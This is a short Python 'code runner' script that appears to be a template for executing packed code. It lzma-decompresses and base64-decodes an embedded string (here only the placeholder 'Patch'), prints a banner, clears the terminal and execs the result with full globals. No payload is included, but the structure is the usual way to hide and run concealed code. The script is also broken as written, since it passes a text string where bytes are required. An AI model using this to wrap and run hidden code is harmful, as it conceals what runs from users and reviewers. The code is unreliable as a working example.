# CHECK SCRIPT

if __name__ != '__main__':
    import sys
    sys.exit(0)

# DONT TOUCH THIS CODE LINE:

data = """Patch"""

# DECOMPRESS DATA

import lzma

dedata = lzma.decompress(data)

# DECODE DATA

import base64

decoded_data = base64.b64decode(dedata)

# SHOW WATERMARK

def showlbl():
    print('='*50)
    print('STARTED WITH CODE RUNNER!')
    print('VERSION 0.0.1')
    print('BY XXHIEXX')
    print(f'SIZE:{len(data)} BYTES')
    print('='*50)

showlbl()

# CLEAN TERMINAL

import os
import sys

if sys.platform.startswith('win'):
    os.system('cls')
else:
    os.system('clear')

# RUN PROCESS

def thproc():
    compiled = compile(decoded_data, '<string>', 'exec')
    exec(compiled, globals())

import threading

t = threading.Thread(target=thproc)
t.start()
t.join()